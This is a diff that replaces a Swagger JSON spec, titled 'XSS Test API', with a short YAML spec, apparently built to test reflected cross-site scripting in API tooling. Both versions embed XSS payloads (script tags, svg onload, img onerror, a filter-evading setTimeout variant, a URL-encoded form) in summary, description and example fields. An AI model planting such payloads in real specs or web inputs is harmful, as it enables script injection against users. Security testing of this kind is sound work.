@@ -1,63 +1,12 @@
-{
-  "swagger": "2.0",
-  "info": {
-    "version": "1.0.0",
-    "title": "XSS Test API",
-    "description": "Reflected XSS test payloadları içerir"
-  },
-  "host": "example.com",
-  "basePath": "/api",
-  "schemes": ["http"],
-  "paths": {
-    "/vuln": {
-      "get": {
-        "tags": ["test"],
-        "summary": "\"><svg/onload=alert(1)>",
-        "description": "<script>alert('XSS in description')</script>",
-        "parameters": [
-          {
-            "name": "input",
-            "in": "query",
-            "description": "Test input for reflected XSS",
-            "required": false,
-            "type": "string",
-            "default": "\"><img src=x onerror=alert('XSS')>"
-          }
-        ],
-        "responses": {
-          "200": {
-            "description": "Response includes reflected input: \"><svg/onload=setTimeout`${'ale'+'rt'}(1)`>"
-          }
-        }
-      }
-    },
-    "/test2": {
-      "post": {
-        "tags": ["test"],
-        "summary": "POST reflected XSS test",
-        "parameters": [
-          {
-            "name": "body",
-            "in": "body",
-            "description": "JSON body with payload",
-            "required": true,
-            "schema": {
-              "type": "object",
-              "properties": {
-                "comment": {
-                  "type": "string",
-                  "example": "\"><script>alert('XSS')</script>"
-                }
-              }
-            }
-          }
-        ],
-        "responses": {
-          "200": {
-            "description": "Reflected body content includes payload"
-          }
-        }
-      }
-    }
-  }
-}
+paths:
+  /api/search:
+    get:
+      parameters:
+        - name: q
+          in: query
+          required: false
+          type: string
+          example: "%22%3E%3Csvg/onload=alert(1)%3E"
+      responses:
+        200:
+          description: Reflected XSS test response
